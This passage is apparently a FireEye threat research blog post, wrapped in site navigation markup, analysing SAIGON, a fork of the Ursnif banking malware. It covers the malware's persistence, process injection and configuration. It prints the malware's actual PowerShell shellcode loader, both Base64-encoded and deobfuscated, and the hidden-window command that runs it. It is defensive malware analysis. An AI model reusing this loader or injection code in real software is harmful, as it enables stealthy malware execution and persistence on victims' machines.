<li itemprop="url"><a href="/products/government.html" itemprop="name" class="MegaMenus">Government</a></li>
<li itemprop="url"><a href="/products/healthcare.html" itemprop="name" class="MegaMenus">Healthcare</a></li>
<li itemprop="url"><a href="/products/industrial-systems-and-critical-infrastructure-security.html" itemprop="name" class="MegaMenus">Industrial Control Systems</a></li>
</ul></div>
<div class="htmlpassthru section">
<style>
  @media (max-width: 1024px) {
    .megamenu-tab .parsys .megamenus .megamenu-cta {
      display: none;
    }
  }
  .content-0-par .megamenus .megamenu-cta {
    background: url(/content/dam/fireeye-www/global/en/nav/bg-nav-customers.jpg) center no-repeat;
    background-size: cover;
    border-radius: 60px 0 0 60px;
    border: 0 solid #ffffff;
  }
  .content-0-par .n03_utility {background-color: transparent;}
  .n03_utility_cell {padding: 0 13px 0 0;}
</style></div>
</div>
</div><div class="separator disabled"></div></div><div class="megamenu-cta">

<div class="n03_utility">
<div class="n03_utility_container">
<div class="n03_utility_table">
<div class="n03_utility_cell">
<h5>Customer Stories</h5>
<p>Explore some of the companies who are succeeding with&nbsp;FireEye.</p>
</div>
<div class="n03_utility_cell"><div class="button"><div class="text-center"><a class="btn btn-2E5799 compact" href="/customers.html" id="learn-more-intel">Read the Stories</a></div></div>
</div>
</div>
</div>
</div></div>
</div>
</div>
<div class="view-all-bar">
<a href="/products.html" class="MegaMenus">
VIEW ALL PRODUCTS</a>
</div></div>
</div>
</div>
</li><li class="megamenu-tab" data-curry="/blog.html" data-link="/mandiant.html">
 <h4 class="megamenu-title">
<a href="/mandiant.html" itemprop="url" class="MegaMenus">Mandiant Solutions</a>
</h4>
<div class="content-1-par parsys"><div class="megamenus section">

<div class="n03_list-item-sub has-inner-cta ">
<div class="n03-sub_container" data-columns="2">
<div class="n03-sub_table">
<div class="col-wrap">
<div class="n03-sub_cell">
<div class="parsys"><div class="megamenu-list section">
<ul><li itemprop="url"><a href="/mandiant/threat-intelligence.html" itemprop="name" class="MegaMenus">Threat Intelligence</a></li>
<li itemprop="url"><a href="/mandiant/security-validation.html" itemprop="name" class="MegaMenus">Security Validation</a></li>
<li itemprop="url"><a href="/mandiant/managed-detection-and-response.html" itemprop="name" class="MegaMenus">Managed Defense</a></li>
</ul></div>
</div>
</div><div class="separator"></div>
<div class="n03-sub_cell">
<div class="parsys"><div class="megamenu-list section">
<ul><li itemprop="url"><a href="/mandiant/incident-response.html" itemprop="name" class="MegaMenus">Incident Response</a></li>
<li itemprop="url"><a href="/mandiant/cyber-security-consulting.html" itemprop="name" class="MegaMenus">Cyber Security Consulting</a></li>
<li itemprop="url"><a href="/mandiant/expertise-on-demand.html" itemprop="name" class="MegaMenus">Expertise On Demand</a></li>
<li itemprop="url"><a href="/services/training.html" itemprop="name" class="MegaMenus">Cyber Security Training</a></li>
</ul></div>
<div class="htmlpassthru section">
<style>
  .content-1-par .megamenus .megamenu-cta {
    background: url(/content/dam/fireeye-www/global/en/nav/bg-nav-mandiant.jpg) center no-repeat;
    background-size: cover;
    background-position: bottom;
    border-radius: 60px 0 0 60px;
    border: 0 solid #ffffff;}
  .content-1-par .n03_utility {background-color: transparent;}
  .n03_utility_cell {padding: 0 13px 0 0;}

</style></div>
</div>
</div><div class="separator disabled"></div></div><div class="megamenu-cta">

<div class="n03_utility">
<div class="n03_utility_container">
<div class="n03_utility_table">
<div class="n03_utility_cell">
<h5>Mandiant Advantage</h5>
<p>The new standard in threat intelligence.</p>
</div>
<div class="n03_utility_cell"><div class="button"><div class="text-center"><a class="btn btn-B2282D expand" href="/mandiant/advantage.html">Learn More</a></div></div>
</div>
</div>
</div>
</div></div>
</div>
</div>
<div class="view-all-bar">
<a href="/mandiant.html" class="MegaMenus">
VIEW ALL Mandiant Solutions</a>
</div></div>
</div>
</div>
</li><li class="megamenu-tab" data-curry="/blog.html" data-link="/customers.html">
<h4 class="megamenu-title">
<a href="/company/customers.html" itemprop="url" class="MegaMenus">Customers</a>
</h4>
<div class="content-2-par parsys"><div class="megamenus section">

<div class="n03_list-item-sub has-inner-cta ">
<div class="n03-sub_container" data-columns="2">
<div class="n03-sub_table">
<div class="col-wrap">
<div class="n03-sub_cell">
<div class="parsys"><div class="megamenu-list section">
<h4 class="n03-sub_title">Customers</h4><ul><li itemprop="url"><a href="/customers.html" itemprop="name" class="MegaMenus">Customer Stories</a></li>
<li itemprop="url"><a href="/company/customers.html" itemprop="name" class="MegaMenus">Customer Success</a></li>
<li itemprop="url"><a href="https://fireeyecommunity.force.com/CustomerCommunity/s/" target="_blank" itemprop="name" class="MegaMenus">Customer Portal</a></li>
</ul></div>
<div class="megamenu-list section">
<h4 class="n03-sub_title">Get Support</h4><ul><li itemprop="url"><a href="/support/contacts.html" itemprop="name" class="MegaMenus">Contact Support</a></li>
</ul></div>
</div>
</div><div class="separator"></div>
<div class="n03-sub_cell">
<div class="parsys"><div class="megamenu-list section">
<h4 class="n03-sub_title">Find Answers</h4><ul><li itemprop="url"><a href="/support/programs.html" itemprop="name" class="MegaMenus">Support Programs</a></li>
<li itemprop="url"><a href="/support/notices.html" itemprop="name" class="MegaMenus">Support Notices</a></li>
<li itemprop="url"><a href="/support/products.html" itemprop="name" class="MegaMenus">Supported Products</a></li>
<li itemprop="url"><a href="https://community.fireeye.com/s/support-community" target="_blank" itemprop="name" class="MegaMenus">Communities</a></li>
<li itemprop="url"><a href="https://docs.fireeye.com" target="_blank" itemprop="name" class="MegaMenus">Documentation Portal</a></li>
</ul></div>
<div class="htmlpassthru section">
<style>
  .content-2-par .megamenus .megamenu-cta {
    background: url(/content/dam/fireeye-www/global/en/nav/bg-nav-support.jpg) center no-repeat;
    background-size: cover;
    border-radius: 60px 0 12px 60px;
    border: 0 solid #ffffff;}
  .content-2-par .n03_utility {background-color: transparent;}
  .n03_utility_cell {padding: 0 13px 0 0;}

</style></div>
</div>
</div><div class="separator disabled"></div></div><div class="megamenu-cta">

<div class="n03_utility">
<div class="n03_utility_container">
<div class="n03_utility_table">
<div class="n03_utility_cell">
<h5>Support</h5>
<p>A global network of support experts available 24x7. We offer simple and flexible support programs to maximize the value of your FireEye products and services.</p>
</div>
<div class="n03_utility_cell"><div class="button"><div class="text-center"><a class="btn btn-2E5799 compact" href="/support.html">Get Support</a></div></div>
</div>
</div>
</div>
</div></div>
</div>
</div>
</div>
</div>
</div>
</li><li class="megamenu-tab" data-curry="/blog.html" data-link="/partners.html">
<h4 class="megamenu-title">
<a href="/partners.html" itemprop="url" class="MegaMenus">Partners</a>
</h4>
<div class="content-3-par parsys"><div class="megamenus section">

<div class="n03_list-item-sub has-inner-cta ">
<div class="n03-sub_container" data-columns="2">
<div class="n03-sub_table">
<div class="col-wrap">
<div class="n03-sub_cell">
<div class="parsys"><div class="megamenu-list section">
<h4 class="n03-sub_title">FireEye Partners</h4><ul><li itemprop="url"><a href="/partners.html" itemprop="name" class="MegaMenus">Partners Overview</a></li>
<li itemprop="url"><a href="/partners/resellers.html" itemprop="name" class="MegaMenus">FireEye Affinity Resellers</a></li>
<li itemprop="url"><a href="/partners/strategic-technology-partners.html" itemprop="name" class="MegaMenus">Technology Partners</a></li>
<li itemprop="url"><a href="/partners/strategic-technology-partners/cyber-risk-insurance.html" itemprop="name" class="MegaMenus">Cyber Risk Partners</a></li>
<li itemprop="url"><a href="/partners/global-solution-providers.html" itemprop="name" class="MegaMenus">Global Solution Providers</a></li>
</ul></div>
</div>
</div><div class="separator"></div>
<div class="n03-sub_cell">
<div class="parsys"><div class="megamenu-list section">
<h4 class="n03-sub_title">Partner Resources</h4><ul><li itemprop="url"><a href="https://partners.fireeye.com/directory/" target="_blank" itemprop="name" class="MegaMenus">Partner Locator</a></li>
<li itemprop="url"><a href="http://training.fireeye.com/" target="_blank" itemprop="name" class="MegaMenus">Partner Education Center</a></li>
<li itemprop="url"><a href="/support.html" itemprop="name" class="MegaMenus">Support</a></li>
</ul></div>
<div class="megamenu-list section">
<h4 class="n03-sub_title">Partnering with FireEye</h4><ul><li itemprop="url"><a href="https://www2.fireeye.com/Partner-Request-LP-New.html" target="_blank" itemprop="name" class="MegaMenus">Become a Partner</a></li>
</ul></div>
<div class="htmlpassthru section">
<style>
  .content-3-par .megamenus .megamenu-cta {
    background: url(/content/dam/fireeye-www/global/en/nav/bg-nav-partners.jpg) center no-repeat;
    background-size: cover;
    border-radius: 60px 0 12px 60px;
    border: 0 solid #ffffff;}
  .content-3-par .n03_utility {background-color: transparent;}
  .n03_utility_cell {padding: 0 13px 0 0;}

</style></div>
</div>
</div><div class="separator disabled"></div></div><div class="megamenu-cta">

<div class="n03_utility">
<div class="n03_utility_container">
<div class="n03_utility_table">
<div class="n03_utility_cell">
<h5>Partner Portal</h5>
<p>Access for our registered Partners to help you be successful with FireEye.
Collateral, deal registration, request for funds, training, enablement, and more.</p>
</div>
<div class="n03_utility_cell"><div class="button"><div class="text-center"><a class="btn btn-F99B1C compact mm-cta" href="https://partners.fireeye.com/" target="_blank">Partner Portal</a></div></div>
</div>
</div>
</div>
</div></div>
</div>
</div>
</div>
</div>
</div>
</li><li class="megamenu-tab" data-curry="/blog.html" data-link="/current-threats.html">
<h4 class="megamenu-title">
<a href="/current-threats.html" itemprop="url" class="MegaMenus">Resources</a>
</h4>
<div class="content-4-par parsys"><div class="megamenus section">

<div class="n03_list-item-sub " id="mandiant-mega-menu">
<div class="n03-sub_container" data-columns="3">
<div class="n03-sub_table">
<div class="col-wrap">
<div class="n03-sub_cell">
<div class="parsys"><div class="megamenu-list section">
<h4 class="n03-sub_title">Intelligence Briefings and Bulletins</h4><ul><li itemprop="url"><a href="/current-threats/annual-threat-report.html" itemprop="name" class="MegaMenus">Annual Threat Reports</a></li>
<li itemprop="url"><a href="/current-threats/threat-intelligence-reports.html" itemprop="name" class="MegaMenus">Threat Intelligence Reports</a></li>
<li itemprop="url"><a href="/current-threats/reports-by-industry.html" itemprop="name" class="MegaMenus">Threat Intelligence Reports by Industry</a></li>
<li itemprop="url"><a href="/current-threats/apt-groups.html" itemprop="name" class="MegaMenus">APT Groups</a></li>
</ul></div>
<div class="megamenu-list section">
<h4 class="n03-sub_title">FireEye Blogs</h4><ul><li itemprop="url"><a href="/blog.html" itemprop="name" class="MegaMenus">Read the FireEye Blogs</a></li>
</ul></div>
</div>
</div><div class="separator"></div>
<div class="n03-sub_cell">
<div class="parsys"><div class="megamenu-list section">
<h4 class="n03-sub_title">Cyber Security</h4><ul><li itemprop="url"><a href="/current-threats/what-is-cyber-security.html" itemprop="name" class="MegaMenus">What is Cyber Security?</a></li>
<li itemprop="url"><a href="/campaigns/clarity-in-the-cloud.html" itemprop="name" class="MegaMenus">Clarity in the Cloud</a></li>
<li itemprop="url"><a href="/campaigns/security-effectiveness.html" itemprop="name" class="MegaMenus">Security Effectiveness and Validation</a></li>
<li itemprop="url"><a href="https://vision.fireeye.com" target="_blank" itemprop="name" class="MegaMenus">The Vision – Digital Magazine</a></li>
<li itemprop="url"><a href="/company/webinars.html" itemprop="name" class="MegaMenus">Webinars</a></li>
</ul></div>
</div>
</div><div class="separator"></div>
<div class="n03-sub_cell">
<div class="parsys"><div class="megamenu-list section">
<h4 class="n03-sub_title">Free Tools & Apps</h4><ul><li itemprop="url"><a href="/services/freeware.html" itemprop="name" class="MegaMenus">Free Software Downloads</a></li>
<li itemprop="url"><a href="https://fireeye.market" target="_blank" itemprop="name" class="MegaMenus">FireEye Market</a></li>
</ul></div>
<div class="megamenu-list section">
<h4 class="n03-sub_title">Training</h4><ul><li itemprop="url"><a href="/services/training.html" itemprop="name" class="MegaMenus">Education and Training</a></li>
</ul></div>
</div>
</div><div class="separator disabled"></div></div></div>
</div>
<div class="view-all-bar">
<a href="/current-threats.html" class="MegaMenus">
VIEW ALL RESOURCES</a>
</div></div>
</div>
</div>
</li><li class="megamenu-tab" data-curry="/blog.html" data-link="/company.html">
<h4 class="megamenu-title">
<a href="/company.html" itemprop="url" class="MegaMenus">Company</a>
</h4>
<div class="content-5-par parsys"><div class="megamenus section">

<div class="n03_list-item-sub has-inner-cta ">
<div class="n03-sub_container" data-columns="2">
<div class="n03-sub_table">
<div class="col-wrap">
<div class="n03-sub_cell">
<div class="parsys"><div class="megamenu-list section">
<h4 class="n03-sub_title">About Us</h4><ul><li itemprop="url"><a href="/company.html" itemprop="name" class="MegaMenus">Why FireEye?</a></li>
<li itemprop="url"><a href="/company/awards.html" itemprop="name" class="MegaMenus">Awards and Honors</a></li>
<li itemprop="url"><a href="/company/leadership.html" itemprop="name" class="MegaMenus">Leadership</a></li>
<li itemprop="url"><a href="/company/board-of-directors.html" itemprop="name" class="MegaMenus">Board of Directors</a></li>
<li itemprop="url"><a href="http://investors.fireeye.com" target="_blank" itemprop="name" class="MegaMenus">Investor Relations</a></li>
</ul></div>
<div class="megamenu-list section">
<h4 class="n03-sub_title">Contact</h4><ul><li itemprop="url"><a href="/company/contact-us.html" itemprop="name" class="MegaMenus">Contact FireEye</a></li>
</ul></div>
<div class="htmlpassthru section">
<style>.g04 .megamenu-list a{padding-right:38px;line-height:1.358;padding-bottom:2px}@media (min-width:60em){.g04 .n03-sub_container{padding-bottom:23px}}@media(min-width:64em) and (max-width:64.5em){.g04 .megamenu-tab:first-child .megamenu-title{padding-left:14px}}@media (min-width:68em) and (max-width:69em){.g04 .megamenu-tab:first-child .megamenu-title{padding-left:30px}}</style></div>
</div>
</div><div class="separator"></div>
<div class="n03-sub_cell">
<div class="parsys"><div class="megamenu-list section">
<h4 class="n03-sub_title">News and Events</h4><ul><li itemprop="url"><a href="/company/newsroom.html" itemprop="name" class="MegaMenus">Newsroom</a></li>
<li itemprop="url"><a href="/company/press-releases.html" itemprop="name" class="MegaMenus">Press Releases</a></li>
<li itemprop="url"><a href="/company/events.html" itemprop="name" class="MegaMenus">Events</a></li>
</ul></div>
<div class="megamenu-list section">
<h4 class="n03-sub_title">Careers</h4><ul><li itemprop="url"><a href="/company/jobs.html" itemprop="name" class="MegaMenus">Job Opportunities</a></li>
<li itemprop="url"><a href="/company/jobs/internships.html" itemprop="name" class="MegaMenus">Internships</a></li>
</ul></div>
<div class="htmlpassthru section">
<style>
  .content-5-par .megamenus .megamenu-cta {
    background: url(/content/dam/fireeye-www/global/en/nav/bg-nav-vision.jpg) center no-repeat;
    background-size: cover;
    border-radius: 60px 0 12px 60px;
    border: 0 solid #ffffff;}
  .content-5-par .n03_utility {background-color: transparent;}
  .n03_utility_cell {padding: 0 13px 0 0;}

</style></div>
</div>
</div><div class="separator disabled"></div></div><div class="megamenu-cta">

<div class="n03_utility">
<div class="n03_utility_container">
<div class="n03_utility_table">
<div class="n03_utility_cell">
<h5>The Vision</h5>
<p>Read our digital magazine providing expert-authored stories, information, unique insights, and advice on cyber security.</p>
</div>
<div class="n03_utility_cell"><div class="button"><div class="text-center"><a class="btn btn-B2282D compact" href="https://vision.fireeye.com/" target="_blank">Get Your Copy</a></div></div>
</div>
</div>
</div>
</div></div>
</div>
</div>
</div>
</div>
</div>
</li></ul>
</nav>
</div>
<span class="burger ficon ficon-menu"></span>
</header>
</div>
</div>


<div id="cookie-privacy-banner" style="display:none;">
<div class="l_container">
<div class="g">
<div class="g-u-1">
<div class="g-content">
<div class="cookie-banner">
<p class="cookie-text">
To give you the best possible experience, this site uses cookies.&nbsp; Find out more on <a href='/company/privacy.html' target='_blank'>how we use cookies</a>.<button type="button" class="cookie-button highlighted" onclick='javascript:onAccept();'>Accept</button>
</p>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="breadcrumbs breadcrumb">
<div class="l_container is-full">
<div class="g02 g02v0" id="g02-breadcrumbs">
<div class="g02_container">
<div class="g02_content">
<ul class="list-inline g02_list" itemscope itemtype="http://schema.org/BreadcrumbList">
<li class="g02_list_item" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" class="BreadCrumb" href="/"><span itemprop="name">Home</span></a><meta itemprop="position" content="1" /></li>
<li class="g02_list_item" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" class="BreadCrumb" href="/blog.html"><span itemprop="name">FireEye Blogs</span></a><meta itemprop="position" content="2" /></li>
<li class="g02_list_item" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" class="BreadCrumb" href="/blog/threat-research.html"><span itemprop="name">Threat Research</span></a><meta itemprop="position" content="3" /></li>
<li class="g02_list_item" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><span itemprop="name">SAIGON, the Mysterious Ursnif Fork<meta itemprop="position" content="6" /></span>
</ul>
</div>
</div>
</div>
</div>
</div>
<main class="l_main" role="main">
<div class="l_container">
<div class="g g-alt ">
<div class="g-u-17-24 l_g-u-1">
<div class="g-content">
<div class="blog main"><div itemscope itemtype="http://schema.org/BlogPosting">
<div class="summary entrytextteaser">
</div>
<div class="title entrytitle">
<h2 class="category-name">Threat Research</h2>
<h1 class="blogpostlanding red" itemprop="headline">SAIGON, the Mysterious Ursnif Fork</h1>
<div class="c00 c00v0 entry-meta-block selfClear">
<time class="entry-date" itemprop="datePublished" content="2020-01-09T17:30:00Z">January 09, 2020</time>
<span class="sep"> | </span>
<span class="by-author" itemscope itemptype="http://schema.org/Person">by <a href="/blog/threat-research.html/category/etc/tags/fireeye-blog-authors/sandor-nemes" title="View all entries filed under 'Fireeye - Authors : Sandor Nemes'">Sandor Nemes</a>, <a href="/blog/threat-research.html/category/etc/tags/fireeye-blog-authors/zander-work" title="View all entries filed under 'Fireeye - Authors : Zander Work'">Zander Work</a><meta itemprop="author" content="Sandor Nemes" /><meta itemprop="contributor" content="Zander Work" /></span>
<div class="tags-section">
<a class="tagList" href="/blog/threat-research.html/category/etc/tags/fireeye-blog-tags/malware"> <span class="tagbutton">Malware</span></a><br class="on-mobile" />
<a class="tagList" href="/blog/threat-research.html/category/etc/tags/fireeye-blog-tags/cybercrime"> <span class="tagbutton">Cybercrime</span></a><br class="on-mobile" />
<a class="tagList" href="/blog/threat-research.html/category/etc/tags/fireeye-blog-tags/financial-industry"> <span class="tagbutton">financial industry</span></a><br class="on-mobile" />
</div>
</div>
</div>
<div class="par parsys"><div class="entrytext section"><div class="c00 c00v0" itemprop="articleBody">
<p>Ursnif (aka Gozi/Gozi-ISFB) is one of the oldest banking malware families still in active distribution. While the first major version of Ursnif was identified in 2006, several subsequent versions have been released in large part due source code leaks. FireEye reported on a previously unidentified variant of the Ursnif malware family to our <a href="https://www.fireeye.com/solutions/cyber-threat-intelligence/threat-intelligence-subscriptions.html">threat intelligence subscribers</a> in September 2019 after identification of a server that hosted a collection of tools, which included multiple point-of-sale malware families. This malware self-identified as &quot;SaiGon version 3.50 rev 132,&quot; and our analysis suggests it is likely based on the source code of the v3 (RM3) variant of Ursnif. Notably, rather than being a full-fledged banking malware, SAIGON's capabilities suggest it is a more generic backdoor, perhaps tailored for use in targeted cybercrime operations.</p>
<h4>Technical Analysis</h4>
<h5>Behavior</h5>
<p>SAIGON appears on an infected computer as a Base64-encoded shellcode blob stored in a registry key, which is launched using PowerShell via a scheduled task. As with other Ursnif variants, the main component of the malware is a DLL file. This DLL has a single exported function, <i>DllRegisterServer</i>, which is an unused empty function. All the relevant functionality of the malware executes when the DLL is loaded and initialized via its entry point.</p>
<p>Upon initial execution, the malware generates a machine ID using the creation timestamp of either <i>%SystemDrive%\pagefile.sys</i> or <i>%SystemDrive%\hiberfil.sys</i> (whichever is identified first). Interestingly, the system drive is queried in a somewhat uncommon way, directly from the <i>KUSER_SHARED_DATA</i> structure (via <i>SharedUserData→NtSystemRoot</i>). <i>KUSER_SHARED_DATA</i> is a structure located in a special part of kernel memory that is mapped into the memory space of all user-mode processes (thus shared), and always located at a fixed memory address<i> (0x7ffe0000</i>, pointed to by the <i>SharedUserData </i>symbol).</p>
<p>The code then looks for the current shell process by using a call to <i>GetWindowThreadProcessId(GetShellWindow(), …)</i>. The code also features a special check; if the checksum calculated from the name of the shell's parent process matches the checksum of <i>explorer.exe</i> (<i>0xc3c07cf0</i>), it will attempt to inject into the parent process instead.</p>
<p>SAIGON then injects into this process using the classic <i>VirtualAllocEx / WriteProcessMemory / CreateRemoteThread</i> combination of functions. Once this process is injected, it loads two embedded files from within its binary:</p>
<ul>
<li>A <i>PUBLIC.KEY</i> file, which is used to verify and decrypt other embedded files and data coming from the malware's command and control (C2) server</li>
<li>A <i>RUN.PS1 </i>file, which is a PowerShell loader script template that contains a &quot;<i>@<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="73203c2621303633">[email&#160;protected]</a></i>&quot; placeholder within the script:</li>
</ul>
<table border="1" cellspacing="0" cellpadding="0">
<tbody><tr><td width="623" valign="top"><p>$hanksefksgu = [System.Convert]::FromBase64String(&quot;@<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="35667a6067767075">[email&#160;protected]</a>&quot;);<br>
Invoke-Expression ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(&quot;JHdneG1qZ2J4dGo9JGh<br>
hbmtzZWZrc2d1Lkxlbmd0aDskdHNrdm89IltEbGxJbXBvcnQoYCJrZXJuZWwzMmAiKV1gbnB1YmxpYyBzdGF<br>
0aWMgZXh0ZXJuIEludDMyIEdldEN1cnJlbnRQcm9jZXNzKCk7YG5bRGxsSW1wb3J0KGAidXNlcjMyYCIpXWB<br>
ucHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldERDKEludFB0ciBteHhhaHhvZik7YG5bRGxsSW1wb3J0K<br>
GAia2VybmVsMzJgIildYG5wdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgQ3JlYXRlUmVtb3RlVGhyZWFkKEl<br>
udFB0ciBoY3d5bHJicywgSW50UHRyIHdxZXIsdWludCBzZmosSW50UHRyIHdsbGV2LEludFB0ciB3d2RyaWN<br>
0d2RrLHVpbnQga2xtaG5zayxJbnRQdHIgdmNleHN1YWx3aGgpO2BuW0RsbEltcG9ydChgImtlcm5lbDMyYCI<br>
pXWBucHVibGljIHN0YXRpYyBleHRlcm4gVUludDMyIFdhaXRGb3JTaW5nbGVPYmplY3QoSW50UHRyIGFqLC<br>
BVSW50MzIga2R4c3hldik7YG5bRGxsSW1wb3J0KGAia2VybmVsMzJgIildYG5wdWJsaWMgc3RhdGljIGV4dG<br>
VybiBJbnRQdHIgVmlydHVhbEFsbG9jKEludFB0ciB4eSx1aW50IGtuYnQsdWludCB0bXJ5d2h1LHVpbnQgd2d1<br>
dHVkKTsiOyR0c2thYXhvdHhlPUFkZC1UeXBlIC1tZW1iZXJEZWZpbml0aW9uICR0c2t2byAtTmFtZSAnV2luMzI<br>
nIC1uYW1lc3BhY2UgV2luMzJGdW5jdGlvbnMgLXBhc3N0aHJ1OyRtaHhrcHVsbD0kdHNrYWF4b3R4ZTo6Vml<br>
ydHVhbEFsbG9jKDAsJHdneG1qZ2J4dGosMHgzMDAwLDB4NDApO1tTeXN0ZW0uUnVudGltZS5JbnRlcm9wU<br>
2VydmljZXMuTWFyc2hhbF06OkNvcHkoJGhhbmtzZWZrc2d1LDAsJG1oeGtwdWxsLCR3Z3htamdieHRqKTskd<br>
GRvY25ud2t2b3E9JHRza2FheG90eGU6OkNyZWF0ZVJlbW90ZVRocmVhZCgtMSwwLDAsJG1oeGtwdWxsLC<br>
RtaHhrcHVsbCwwLDApOyRvY3h4am1oaXltPSR0c2thYXhvdHhlOjpXYWl0Rm9yU2luZ2xlT2JqZWN0KCR0ZG<br>
9jbm53a3ZvcSwzMDAwMCk7&quot;)));</p>
</td>
</tr></tbody></table>
<p>The malware replaces the &quot;<i>@<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="fdaeb2a8afbeb8bd">[email&#160;protected]</a></i>&quot; placeholder from this PowerShell script template with a Base64-encoded version of itself, and writes the PowerShell script to a registry value named &quot;<i>PsRun</i>&quot; under the &quot;<i>HKEY_CURRENT_USER\Identities\{&lt;random_guid&gt;}</i>&quot; registry key (Figure 1).</p>
<p><img src="/content/dam/fireeye-www/blog/images/saigon/Picture1.png" alt=""><br>
<span class="type-XS">Figure 1: PowerShell script written to <i>PsRun</i></span></p>
<p>The instance of SAIGON then creates a new scheduled task (Figure 2) with the name &quot;<i>Power&lt;random_word&gt;</i>&quot; (e.g. <i>PowerSgs</i>). If this is unsuccessful for any reason, it falls back to using the &quot;<i>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</i>&quot; registry key to enable itself to maintain persistence through system reboot.</p>
<p><img src="/content/dam/fireeye-www/blog/images/saigon/Picture2.png" alt=""><br>
<span class="type-XS">Figure 2: Scheduled task</span></p>
<p>Regardless of the persistence mechanism used, the command that executes the binary from the registry is similar to the following:</p>
<table border="1" cellspacing="0" cellpadding="0">
<tbody><tr><td width="623" valign="top"><p>PowerShell.exe -windowstyle hidden -ec aQBlAHgAIAAoAGcAcAAgACcASABLAEMAVQA6AFwASQBkAGUAbgB0AGkAdABpAGUAcwBcAHsANAAzAEIA<br>
OQA1AEUANQBCAC0ARAAyADEAOAAtADAAQQBCADgALQA1AEQANwBGAC0AMgBDADcAOAA5AEMANQA5<br>
AEIAMQBEAEYAfQAnACkALgBQAHMAUgB1AG4A</p>
</td>
</tr></tbody></table>
<p>After removing the Base64 encoding from this command, it looks something like &quot;<i>iex (gp 'HKCU:\\Identities\\{43B95E5B-D218-0AB8-5D7F-2C789C59B1DF}').PsRun.</i>&quot;<i> </i>&nbsp;When executed, this command retrieves the contents of the previous registry value using <i>Get-ItemProperty</i> (<i>gp</i>) and executes it using <i>Invoke-Expression</i> (<i>iex</i>).</p>
<p>Finally, the PowerShell code in the registry allocates a block of memory, copies the Base64-decoded shellcode blob into it, launches a new thread pointing to the area using <i>CreateRemoteThread</i>, and waits for the thread to complete. The following script is a deobfuscated and beautified version of the PowerShell.</p>
<table border="1" cellspacing="0" cellpadding="0">
<tbody><tr><td width="623" valign="top"><p>$hanksefksgu = [System.Convert]::FromBase64String(&quot;@<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="9dced2c8cfded8dd">[email&#160;protected]</a>&quot;);<br>
$wgxmjgbxtj = $hanksefksgu.Length;</p>
<p>$tskvo = @&quot;<br>
[DllImport(&quot;kernel32&quot;)]<br>
public static extern Int32 GetCurrentProcess();</p>
<p>[DllImport(&quot;user32&quot;)]<br>
public static extern IntPtr GetDC(IntPtr mxxahxof);</p>
<p>[DllImport(&quot;kernel32&quot;)]<br>
public static extern IntPtr CreateRemoteThread(IntPtr hcwylrbs, IntPtr wqer, uint sfj, IntPtr wllev, IntPtr wwdrictwdk, uint klmhnsk, IntPtr vcexsualwhh);</p>
<p>[DllImport(&quot;kernel32&quot;)]<br>
public static extern UInt32 WaitForSingleObject(IntPtr aj, UInt32 kdxsxev);</p>
<p>[DllImport(&quot;kernel32&quot;)]<br>
public static extern IntPtr VirtualAlloc(IntPtr xy, uint knbt, uint tmrywhu, uint wgutud);<br>
&quot;@;</p>
<p>$tskaaxotxe = Add-Type -memberDefinition $tskvo -Name 'Win32' -namespace Win32Functions -passthru;<br>
$mhxkpull = $tskaaxotxe::VirtualAlloc(0, $wgxmjgbxtj, 0x3000, 0x40);[System.Runtime.InteropServices.Marshal]::Copy($hanksefksgu, 0, $mhxkpull, $wgxmjgbxtj);<br>
$tdocnnwkvoq = $tskaaxotxe::CreateRemoteThread(-1, 0, 0, $mhxkpull, $mhxkpull, 0, 0);<br>
$ocxxjmhiym = $tskaaxotxe::WaitForSingleObject($tdocnnwkvoq, 30000);</p>
</td>
</tr></tbody></table>
<p>Once it has established a foothold on the machine, SAIGON loads and parses its embedded <i>LOADER.INI</i> configuration (see the Configuration section for details) and starts its main worker thread, which continuously polls the C2 server for commands.</p>
<h5>Configuration</h5>
<p>The Ursnif source code incorporated a concept referred to as &quot;joined data,&quot; which is a set of compressed/encrypted files bundled with the executable file. Early variants relied on a special structure after the PE header and marked with specific magic bytes (&quot;<i>JF,</i>&quot; &quot;<i>FJ,</i>&quot; &quot;<i>J1,</i>&quot; &quot;<i>JJ,</i>&quot; depending on the Ursnif version). In Ursnif v3 (Figure 3), this data is no longer simply after the PE header but pointed to by the Security Directory in the PE header, and the magic bytes have also been changed to &quot;<i>WD</i>&quot; (<i>0x4457</i>).</p>
<p><img src="/content/dam/fireeye-www/blog/images/saigon/Figure%203a.png" alt=""><br>
<span class="type-XS">Figure 3: Ursnif v3 joined data</span></p>
<p>This structure defines the various properties (offset, size, and type) of the bundled files. This is the same exact method used by SAIGON for storing its three embedded files:</p>
<ul>
<li><i>PUBLIC.KEY</i> - RSA public key</li>
<li><i>RUN.PS1</i> - PowerShell script template</li>
<li><i>LOADER.INI - </i>Malware configuration</li>
</ul>
<p>The following is a list of configuration options observed:</p>
<table border="1" cellspacing="0" cellpadding="0" width="631">
<tbody><tr><td width="103"><p><b>Name Checksum</b></p>
</td>
<td width="134"><p><b>Name</b></p>
</td>
<td width="394"><p><b>Description</b></p>
</td>
</tr><tr><td width="103"><p><i>0x97ccd204</i></p>
</td>
<td width="134"><p><i>HostsList</i></p>
</td>
<td width="394"><p>List of C2 URLs used for communication</p>
</td>
</tr><tr><td width="103"><p><i>0xd82bcb60</i></p>
</td>
<td width="134"><p><i>ServerKey</i></p>
</td>
<td width="394"><p>Serpent key used for communicating with the C2</p>
</td>
</tr><tr><td width="103"><p><i>0x23a02904</i></p>
</td>
<td width="134"><p><i>Group</i></p>
</td>
<td width="394"><p>Botnet ID</p>
</td>
</tr><tr><td width="103"><p><i>0x776c71c0</i></p>
</td>
<td width="134"><p><i>IdlePeriod</i></p>
</td>
<td width="394"><p>Number of seconds to wait before the initial request to the C2</p>
</td>
</tr><tr><td width="103"><p><i>0x22aa2818</i></p>
</td>
